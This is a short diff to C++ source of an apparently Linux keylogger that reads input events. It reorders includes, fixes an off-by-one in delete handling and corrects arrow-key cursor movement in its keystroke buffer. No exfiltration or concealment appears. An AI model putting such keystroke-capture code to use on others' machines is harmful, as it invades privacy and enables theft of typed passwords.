@@ -1,10 +1,10 @@
-#include <iostream>
-#include <fstream>
-#include <string>
-#include <vector>
-#include <map>
 #include <chrono>
 #include <ctime>
+#include <fstream>
+#include <iostream>
+#include <map>
+#include <string>
+#include <vector>
 
 #include <linux/input.h>
 
@@ -143,7 +143,7 @@ void handle_delete(struct keylogger_ctx *ctx)
     std::cout << "cursor " << ctx->buffer_cursor << std::endl;
     std::cout << "size " << ctx->kb_buffer.size() << std::endl;
     if (ctx->buffer_cursor < ctx->kb_buffer.size()) {
-        ctx->kb_buffer.erase(ctx->kb_buffer.begin() + ctx->buffer_cursor--);
+        ctx->kb_buffer.erase(ctx->kb_buffer.begin() + ctx->buffer_cursor);
     }
 
     std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
@@ -162,7 +162,7 @@ void handle_backspace(struct keylogger_ctx *ctx)
 
 void handle_arrow(struct keylogger_ctx *ctx)
 {
-    ctx->buffer_cursor = (ctx->current_key == KEY_RIGHT)
+    ctx->buffer_cursor = (ctx->current_key == KEY_LEFT)
         ? (ctx->buffer_cursor - 1)
         : (ctx->buffer_cursor + 1);
     std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
@@ -185,7 +185,6 @@ int main(int argc, char *argv[])
 
             // TODO: delete
             // TODO: tab
-            // TODO: cursors
             // TODO: capslock
             if (ev.type == EV_KEY && ev.value) {
                 try {
